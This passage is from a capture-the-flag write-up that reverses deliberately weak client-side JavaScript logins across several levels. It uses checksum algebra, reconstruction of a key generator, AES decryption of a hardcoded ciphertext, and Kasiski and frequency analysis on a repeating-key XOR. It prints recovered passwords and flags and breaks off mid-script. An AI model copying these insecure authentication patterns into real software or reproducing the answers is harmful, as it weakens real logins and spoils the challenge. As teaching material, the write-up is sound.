<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$(&#39;.c_submit&#39;)[&#39;click&#39;](function () {
    var _0xf382x1 = $(&#39;#cpass&#39;)[&#39;val&#39;]();
    var _0xf382x2 = &#39;alk3&#39;;
    if (_0xf382x1 == &#39;02l1&#39; + _0xf382x2) {
        if (document[&#39;location&#39;][&#39;href&#39;][&#39;indexOf&#39;](&#39;?p=&#39;) == -1) {
            document[&#39;location&#39;] = document[&#39;location&#39;][&#39;href&#39;] + &#39;?p=&#39; + _0xf382x1;
        };
    } else {
        $(&#39;#cresponse&#39;)[&#39;html&#39;](&#39;&lt;div class=\&#39;error\&#39;&gt;Wrong password sorry.&lt;/div&gt;&#39;);
    };
});
</code></pre></div><p>So the password is <code>02l1alk3</code> which leaves to the flag: <code>FLAG-5PJne3T8d73UGv4SCqN44DXj</code>.</p>
<h2 id="level-4-why-not">Level 4: Why not?</h2>
<p>The source code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">// Look&#39;s like weak JavaScript auth script :)
$(&#34;.c_submit&#34;).click(function(event) {
    event.preventDefault();
    var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283);
    var u = $(&#34;#cuser&#34;).val();
    var p = $(&#34;#cpass&#34;).val();
    var t = true;

    if(u == &#34;administrator&#34;) {
        for(i = 0; i &lt; u.length; i++) {
            if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) {
                $(&#34;#cresponse&#34;).html(&#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&#34;);
                t = false;
                break;
            }
        }
    } else {
        $(&#34;#cresponse&#34;).html(&#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&#34;);
        t = false;
    }
    if(t) {
        if(document.location.href.indexOf(&#34;?p=&#34;) == -1) {
            document.location = document.location.href + &#34;?p=&#34; + p;
            }
    }
});
</code></pre></div><p>If you look closely at the code, you&rsquo;ll see follwoing algorithm:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">k: 176,214,205,246,264,255,227,237,242,244,265,270,283
u: 97,100,109,105,110,105,115,116,114,97,116,111,114

u[i] + p[i] + i*10 = k[i]
</code></pre></div><p>So we have to find out <code>p</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p[i] = k[i] - u[i] - i*10
</code></pre></div><p>Let&rsquo;s write some python code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">k = [176,214,205,246,264,255,227,237,242,244,265,270,283]
u = [97,100,109,105,110,105,115,116,114,97,116,111,114]
p = {}

s = &#34;administrator&#34;

for i in range(0, len(s)):
    p[i] = k[i] - u[i] - i*10

L = list(tuple(p.values()))
print(&#39;&#39;.join(chr(i) for i in L))
</code></pre></div><p>Which gives me <code>OhLord4309111</code>. That in turn reveals the flag: <code>FLAG-65t23674o6N2NehA44272G24</code>.</p>
<h2 id="level-5-valid-key-required">Level 5: Valid key required</h2>
<p>First let&rsquo;s have a look at the JavaScript:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">function curry( orig_func ) {
    var ap = Array.prototype, args = arguments;

    function fn() {
        ap.push.apply( fn.args, arguments ); 
        return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args );
    }

    return function() {
        fn.args = ap.slice.call( args, 1 );
        return fn.apply( this, arguments );
    };
}

function callback(x,y,i,a) {
    return !y.call(x, a[a[&#34;length&#34;]-1-i].toString().slice(19,21)) ? x : {};
}

var ref = {T : &#34;BG8&#34;,J : &#34;jep&#34;,j : &#34;M2L&#34;,K : &#34;L23&#34;,H : &#34;r1A&#34;};

function validatekey()
{
    e = false;
    var _strKey = &#34;&#34;;
    try {
        _strKey = document.getElementById(&#34;key&#34;).value;
        var a = _strKey.split(&#34;-&#34;);
        if(a.length !== 5)
            e = true;

        var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));

        if(!equal(o,ref))
            e = true;

    }catch(e){
        e = true;
    }

    if(!e) {
        if(document.location.href.indexOf(&#34;?p=&#34;) == -1) {
            document.location = document.location.href + &#34;?p=&#34; + _strKey;
        }
    } else {
        $(&#34;#cresponse&#34;).html(&#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&#34;);
    }   
}

function equal(o,o1)
{
    var keys1 = Object.keys(o1);
    var keys = Object.keys(o);
    if(keys1.length != keys.length)
        return false;

    for(var i=0;i&lt;keys.length;i++)
        if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]])
            return false;

    return true;

}

function hook(f1,f2,f3) {
    return function(x) { return f2(f1(x),f3(x));};
}

var h = curry(hook);
var fn = h(function(x) {return x &gt;= 48;},new Function(&#34;a&#34;,&#34;b&#34;,&#34;return a &amp;&amp; b;&#34;));
function genFunc(_part) {
    if(!_part || !(_part.length) || _part.length !== 4)
        return function() {};

    return new Function(_part.substring(1,3), &#34;this.&#34; + _part[3] + &#34;=&#34; + _part.slice(1,3) + &#34;+&#34; + (fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ?  _part[0] : &#34;&#39;&#34;+ _part[0] + &#34;&#39;&#34;));
}
</code></pre></div><p>Now lets break this down to some functional parts:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[...]
_strKey = document.getElementById(&#34;key&#34;).value;
var a = _strKey.split(&#34;-&#34;);
if(a.length !== 5)
    e = true;
[...]
</code></pre></div><p>Obvisouly the input has to be sth like this: &ldquo;AAAA-BBBB-CCCC-DDDD-EEEE&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var h = curry(hook);
var fn = h(function(x) {return x &gt;= 48;},new Function(&#34;a&#34;,&#34;b&#34;,&#34;return a &amp;&amp; b;&#34;));
function genFunc(_part) {
    if(!_part || !(_part.length) || _part.length !== 4)
        return function() {};

    return new Function(_part.substring(1,3), &#34;this.&#34; + _part[3] + &#34;=&#34; + _part.slice(1,3) + &#34;+&#34; + (fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ?  _part[0] : &#34;&#39;&#34;+ _part[0] + &#34;&#39;&#34;));
}

</code></pre></div><p>Having done JavaScript debugging in the browser, this is what <code>genFunc()</code> does:</p>
<ul>
<li>it takes a string of 4 characters as input</li>
<li>it takes the first character of the input as ASCII code (<code>_part.charCodeAt(0)</code>) and checks if:
<ul>
<li>ASCII code &gt;= 48</li>
<li>ASCII code &lt;= 57</li>
<li>if you check the <a href="http://www.asciitable.com">ASCII table</a> you&rsquo;ll notice that this is the range for <strong>digits</strong></li>
<li>depending wether the character is digit or not a new <strong>function</strong> will be build.</li>
</ul>
</li>
</ul>
<blockquote>
<p>And btw: This is the whole magic behind the <em>curry-hook-magic-function-javascript-voodoo</em>.</p>
</blockquote>
<p>Supposing the input is sth like &ldquo;ABCD&rdquo; then a new JavaScript function is being created:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">function new_function (bc) {
    this.d = bc + &#39;a&#39;  
}
</code></pre></div><p>If we had sth like &ldquo;ABC1&rdquo; then the function would have been created like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">function new_function (bc) {
    this.d = bc + 1 
}
</code></pre></div><p>Let&rsquo;s continue analyzing the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));
</code></pre></div><p>After splitting the input &ldquo;AAAA-BBBB-CCCC-DDDD-EEEE&rdquo; to an array &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">a = [&#39;AAAA&#39;, &#39;BBBB&#39;, &#39;CCCC&#39;, &#39;DDDD&#39;, &#39;EEEE&#39;] 
</code></pre></div><p>&hellip; <code>genFunc()</code> is then being applied to all elements inside the array.</p>
<blockquote>
<p>Remember? genFunc will simply return a function as described above.</p>
</blockquote>
<p>In the next step <code>reduceRight()</code> is being called with a <code>callback</code> and an initial value.
The syntax for <code>reduceRight</code> looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">arr.reduceRight(callback[, initialValue])
</code></pre></div><p>as stated <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Array/reduceRight">here</a>.
And the syntax for the <code>callback</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">function(previousValue, currentValue, index, array)
</code></pre></div><p>You can try to understand the <code>callback</code> function what it really does in JavaScript <strong>or</strong> you reverse it and build it <strong>Python</strong>.
Before doing that let&rsquo;s build <code>genFunc</code> in Python:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">def genFunc(part):
    # Assume that length of part is 4
    c = &#39;&#39;
    
    # Check if first character is a digit
    if part[0].isdigit():
        c = part[0]
    else: 
        c = &#39;&#34;&#39; + part[0] + &#39;&#34;&#39;
        
    # Create functions 
    def f_part(p,d):
        &#34;&#34;&#34;
            p: parameter
            d: dictionary
        &#34;&#34;&#34;
        
        # This will concatenate the first character of part with p
        # e.g. if part = &#39;abcd&#39; and p=&#39;k&#39; then a new dictionary will
        # be created: 
        #    dict[&#39;d&#39;] = &#39;bc&#39; + &#39;k&#39;
        #   
        d[part[3]] = &#39;&#39;.join(p) + &#39;&#39;.join(part[0])
        
        return d
    
    return {&#39;func&#39;: f_part}
</code></pre></div><p>Calling <code>genFunc</code> for a list of paremeters would then give you a list of functions:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">IN: a = [&#39;abcd&#39;,&#39;efgh&#39;,&#39;ijkl&#39;,&#39;mnoq&#39;, &#39;prts&#39;]
    funcs = [genFunc(list(x)) for x in a]

Out: [{&#39;func&#39;: &lt;function __main__.f_part&gt;},
      {&#39;func&#39;: &lt;function __main__.f_part&gt;},
      {&#39;func&#39;: &lt;function __main__.f_part&gt;},
      {&#39;func&#39;: &lt;function __main__.f_part&gt;},
      {&#39;func&#39;: &lt;function __main__.f_part&gt;}]
</code></pre></div><p>And now comes the <code>callback</code> aka the <strong>magic</strong> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">def magic_function(a):
    
    # Do a &#34;reverse&#34; loop: Starting from the length of input array go down to 0.
    # e.g. if len(a) = 5 then i will have following values: 4,3,2,1,0
    for i in range(len(a)-1, -1, -1):
        j = len(a) - 1 - i
        
        &#34;&#34;&#34;
            Basically the algo looks like this:
            
            d = {}
            d[a[i][3]] = a[j][1:3] + a[i][0]
        &#34;&#34;&#34;
        
        # Pickup 2nd and 3rd character from the part where a[i] is pointing to
        b = &#39;&#39;.join(a[i][1:3])
        
        # Pickup the function
        y = funcs[i][&#39;func&#39;]
        
        # Pickup 2nd and 3rd character from the part where a[len(a) - 1 -i] is pointing to
        p = &#39;&#39;.join(a[j][1:3])

        # Call the function 
        x = y(p, y(b, {}))

        print(&#34;i:%d\tj:%d\ta[j][1:3]:%s\ta[i][0]:%s\tdict:%s&#34; % (i, j, p, a[i][0], x))
</code></pre></div><p>Let&rsquo;s call this for some dummy list:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In: a = [&#39;abcd&#39;,&#39;efgh&#39;,&#39;ijkl&#39;,&#39;mnoq&#39;, &#39;prts&#39;]
    magic_function(a)

Out: 
i:4 j:0 a[j][1:3]:bc    a[i][0]:p   dict:{&#39;s&#39;: &#39;bcp&#39;}
i:3 j:1 a[j][1:3]:fg    a[i][0]:m   dict:{&#39;q&#39;: &#39;fgm&#39;}
i:2 j:2 a[j][1:3]:jk    a[i][0]:i   dict:{&#39;l&#39;: &#39;jki&#39;}
i:1 j:3 a[j][1:3]:no    a[i][0]:e   dict:{&#39;h&#39;: &#39;noe&#39;}
i:0 j:4 a[j][1:3]:rt    a[i][0]:a   dict:{&#39;d&#39;: &#39;rta&#39;}
</code></pre></div><p>So for <code>a</code> as an input you&rsquo;ll get a dictionary:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">dict:{&#39;s&#39;: &#39;bcp&#39;, &#39;q&#39;: &#39;fgm&#39;, &#39;l&#39;: &#39;jki&#39;, &#39;h&#39;: &#39;noe&#39;, &#39;d&#39;: &#39;rta&#39;}
</code></pre></div><p>If you pay attention how the characters of the elements in <code>a</code> have been arranged,
you&rsquo;ll be able to find an array as input so that the generated result looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ref = {&#39;T&#39; : &#34;BG8&#34;, &#39;J&#39; : &#34;jep&#34;, &#39;j&#39; : &#34;M2L&#34;, &#39;K&#39; : &#34;L23&#34;, &#39;H&#39; : &#34;r1A&#34;};
</code></pre></div><p>And the final key is:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In: a = [&#39;ABGH&#39;, &#39;3jeK&#39;, &#39;LM2j&#39;, &#39;pL2J&#39;, &#39;8r1T&#39;]
    magic_function(a)

Out:
i:4 j:0 a[j][1:3]:BG    a[i][0]:8   dict:{&#39;T&#39;: &#39;BG8&#39;}
i:3 j:1 a[j][1:3]:je    a[i][0]:p   dict:{&#39;J&#39;: &#39;jep&#39;}
i:2 j:2 a[j][1:3]:M2    a[i][0]:L   dict:{&#39;j&#39;: &#39;M2L&#39;}
i:1 j:3 a[j][1:3]:L2    a[i][0]:3   dict:{&#39;K&#39;: &#39;L23&#39;}
i:0 j:4 a[j][1:3]:r1    a[i][0]:A   dict:{&#39;H&#39;: &#39;r1A&#39;}
</code></pre></div><p>Bingo! So the key is <code>ABGH-3jeK-LM2j-pL2J-8r1T</code> which in turn reveals the flag:
<code>FLAG-ONj755sYn2Js8C96h2L662Jz</code>.</p>
<h2 id="level-6-most-secure-crypto-algo">Level 6: Most Secure Crypto Algo</h2>
<p>As always let&rsquo;s have a look at the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$(&#34;.c_submit&#34;).click(function(event) {
    event.preventDefault();
    var k = CryptoJS.SHA256(&#34;\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37&#34;);
    var u = $(&#34;#cuser&#34;).val();
    var p = $(&#34;#cpass&#34;).val();
    var t = true;

    if(u == &#34;\x68\x34\x78\x30\x72&#34;) {
        if(!CryptoJS.AES.encrypt(p, CryptoJS.enc.Hex.parse(k.toString().substring(0,32)), { iv: CryptoJS.enc.Hex.parse(k.toString().substring(32,64)) }) == &#34;ob1xQz5ms9hRkPTx+ZHbVg==&#34;) {
            t = false;
        }
        } else {
            $(&#34;#cresponse&#34;).html(&#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&#34;);
            t = false;
        }

    if(t) {
        if(document.location.href.indexOf(&#34;?p=&#34;) == -1) {
            document.location = document.location.href + &#34;?p=&#34; + p;
        }
    }
});
</code></pre></div><p>So it&rsquo;s an <strong>AES</strong> encryption in <strong>CBC</strong> mode with an <strong>IV</strong>. Let&rsquo;s transcript that code to some <strong>node JS</strong> code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!/usr/bin/env node
var CryptoJS = require(&#34;crypto-js&#34;);

// Simple function to convert a hex string to ascii
function hex_to_ascii(str1) {  
    var hex  = str1.toString();  
    var str = &#39;&#39;;  
    for (var n = 0; n &lt; hex.length; n += 2) {  
        str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));  
    }  
    return str;  
}  

// This is what we have
var user = &#34;\x68\x34\x78\x30\x72&#34;;
var k = CryptoJS.SHA256(&#34;\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37&#34;);
var key = CryptoJS.enc.Hex.parse(k.toString().substring(0,32));
var iv = CryptoJS.enc.Hex.parse(k.toString().substring(32,64));
var encrypted = &#34;ob1xQz5ms9hRkPTx+ZHbVg==&#34;;

// Do the decryption
p = CryptoJS.AES.decrypt(encrypted, key, {iv: iv})

// Convert word array to (hex) string
k = &#39;&#39; + p;

console.log(user, hex_to_ascii(k));
</code></pre></div><p>I think the main difficulty was to convert the word array to sth useful. Anyway: Using <code>h4x0r PassW0RD!289%!*</code>
as username/password will reveal the flag: <code>FLAG-gYtLBa66178DG7l28Uu5lW45CR</code>.</p>
<h2 id="level-7-why-not-be-more-secure">Level 7: Why not be more secure?</h2>
<p>This challenge was indeed more fun. Let&rsquo;s have a look why:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">1 var u = $(&#34;#cpass&#34;).val();
2 var k = $(&#34;#cuser&#34;).val();
3 var func = &#34;\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F&#34;;
4 buf = &#34;&#34;;
5 if(k.length == 9) {
6     for(i = 0, j = 0; i &lt; func.length; i++) {
7         c = parseInt(func.charCodeAt(i));
8         c = c ^ k.charCodeAt(j);
9         if(++j == k.length) {
10             j = 0;
11         }
12         buf += eval(&#39;&#34;&#39; + a(x(c)) + &#39;&#34;&#39;);
13     }
14     eval(buf);
15 } else {
16     $(&#34;#cresponse&#34;).html(&#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password sorry.&lt;/div&gt;&#34;);
17 }
18 });
19 
20 function a(h) {
21     if(h.length != 2) {
22         h = &#34;\x30&#34; + h;
23     }
24     return &#34;\x5c\x78&#34; + h;
25 }
26 
27 function x(d) {
28     if(d &lt; 0) {
29         d = 0xFFFFFFFF + d + 1;
30     }
31     return d.toString(16).toUpperCase();
32 }
</code></pre></div><p>As we can see in line 5 the key has to have a length of 9. Futhermore we can see that the key (k) is being <strong>XOR&rsquo;ed</strong>
with characters of <code>func</code>. In lines 9-11 we can see that <code>j</code> is resetted to 0 if it exceeds the key&rsquo;s length. That means
characters of <code>k</code> are used <strong>multiple</strong> times in the XOR operation. So let&rsquo;s stop for a minute and think about what we&rsquo;ve
got:</p>
<ul>
<li>XOR operation</li>
<li>small key length</li>
<li>the key is being used multiple times to perform the decryption</li>
</ul>
<h3 id="polyalphabetic-ciphers">Polyalphabetic ciphers</h3>
<p>Hmmm&hellip; That smells like <a href="https://en.wikipedia.org/wiki/Polyalphabetic_cipher">polyalphabetic ciphers</a> which are
<a href="https://en.wikipedia.org/wiki/Substitution_cipher">substitution ciphers</a>! (No shit! That was indeed my first idea :).
Although the number of possible keys is very large, these ciphers are not very strong due to following reasons: By
having a reasonable length of an (encrypted) message, one could do a <strong>frequency analysis</strong>. That means, by having a
look at the frequency distribution of symbols (characters inside the encrypted text), one could deduce the meaning of
the most common symbol. In the English language for example the most common (3 letter) word would be &ldquo;the&rdquo;. Let&rsquo;s say
you have an encrypted text and you know that the text was originally written in English. Then you could look for a
<strong>sequence</strong> of letters (let&rsquo;s say CHZ) in your ciphertext. If this sequence has the most distribution in the
ciphertext, then you have probably found the encrypted text for &ldquo;the&rdquo;. Afterwards you can find the corresponding
alphabet which was used to encrypt the message, just by &ldquo;shifting around&rdquo;. Let&rsquo;s have a look what that means.</p>
<h3 id="some-example">Some example</h3>
<p>Let&rsquo;s say our message is sth like <code>THIS IS A VERY LONG MESSAGE</code>. As an alphabet let&rsquo;s take the English one (A-Z
which are 26 letters). The encryption process will look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Alphabet    ABCDEFGHIJKLMNOPQRSTUVWXYZ 
Plaintext   THISISAVERYLONGMESSAGE

Formular for ciphertext:
En(x) = (x + n) mod 26

 
With a shift of 3 (n = 3), the encryption of letter &#34;T&#34; (position 19 in the alphabet) will result in:

En(&#34;T&#34;) = (19 + 3) mod 26
        = 22
        = &#34;W&#34;
</code></pre></div><p>The <em>decryption</em> works almost the same way:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Dn(x) = (x - n) mod 26

where:

n: how many letters has the alphabet been shifted
x: position of letter to be decrypted in the alphabet
</code></pre></div><p>For the example we had above let&rsquo;s do the decryption:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Dn(&#34;W&#34;) = (22 - 3) mod 26
        = 19
        = &#34;T&#34;
</code></pre></div><h3 id="kasiski-analysis">Kasiski analysis</h3>
<p>For the further cryptanalysis it is important to determine the key length. The
(<a href="https://en.wikipedia.org/wiki/Kasiski_examination">Kasiski</a>) examination involves looking for sequence of letters that
are repeated in the ciphertext. Then if the distances between consecutive sequences of letters are likely to be
multiples of the length of the key. Doing this for different letter sequences narrows down the possible key lengths,
since we can take the GCD (greatest common divisor) of all distances.</p>
<p>Using some small python utility, I&rsquo;ve scanned the ciphertext for occurences of the same letter. Addtionally I&rsquo;ve
incremented the offset between the letters and counted the occurences:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
# Counts the occurences in a given text for a specified key length offset 
def kasiski(text, offset):
    c = 0
    for i in range(0, len(text)):
        
        # If we find somewhere else the same character, increment counter
        if text[i] == text[(i + offset) % len(text)]:
            # Hint!
            c += 1
    return c

# Encrypted text
hex = &#34;\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F&#34;

# Generate offsets: 1 - 20 
offsets = range(1,20)

for o in offsets: 
    print(&#34;Offset: %d\tOccurences: %d&#34; % (o, kasiski(hex, o)))

</code></pre></div><p>And the results:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Offset: 1   Occurences: 7
Offset: 2   Occurences: 3
Offset: 3   Occurences: 3
Offset: 4   Occurences: 3
Offset: 5   Occurences: 2
Offset: 6   Occurences: 5
Offset: 7   Occurences: 2
Offset: 8   Occurences: 2
Offset: 9   Occurences: 16
Offset: 10  Occurences: 3
Offset: 11  Occurences: 2
Offset: 12  Occurences: 3
Offset: 13  Occurences: 4
Offset: 14  Occurences: 0
Offset: 15  Occurences: 0
Offset: 16  Occurences: 2
Offset: 17  Occurences: 2
Offset: 18  Occurences: 4
Offset: 19  Occurences: 2
</code></pre></div><p>As you can see the most occurences have taken place when offset = 9. We can verify this finding by having a look at the
JavaScript code above:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">5 if(k.length == 9) { 
</code></pre></div><p>So the key length <strong>has</strong> to be 9. Okay, let&rsquo;s move on to the next step.</p>
<h3 id="frequency-analysis">Frequency analysis</h3>
<p>The big weakness of substitution ciphers is that they don&rsquo;t hide information about statistical characteristics of the
originating plaintext. We can use this to conduct a <a href="https://en.wikipedia.org/wiki/Frequency_analysis">frequency analysis</a>
which will help us finally decrypt the text.</p>
<p>In the next step I&rsquo;ll calculate the frequency distribution of the letters in the encrypted text. So basically I&rsquo;ll count
how many times each letter appears. Afterwards I&rsquo;ll compare this distribution to the letter frequency distribution of some
JavaScript library.</p>
<h4 id="letter-frequency-for-d3-javascript">Letter frequency for D3 (JavaScript)</h4>
<p>I&rsquo;ll use JavaScript code (in my case <a href="https://d3js.org/d3.v4.min.js">D3</a>) in order to have a good comparison (I suppose
the ciphertext is also some JavaScript code as well):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import collections
import os

def countletters(myfile):
    &#34;&#34;&#34; Returns a dictionary containing a occurence frequency of each found character&#34;&#34;&#34;
    d = collections.defaultdict(int)
    myfile = open(myfile)
    for line in myfile:
        line = line.rstrip(&#39;\n&#39;)
        for c in line:
            d[c] += 1
    return d

def get_letters_count(myfile):
    &#34;&#34;&#34; Gets amount of characters in myfile &#34;&#34;&#34;
    with open(myfile) as f:
        c = f.read()
        return len(c)

filename = &#39;/tmp/d3.v4.min.js&#39;
freqs = countletters(filename)
file_size = get_letters_count(filename)

percent_freqs = {}
for k,v in freqs.iteritems():
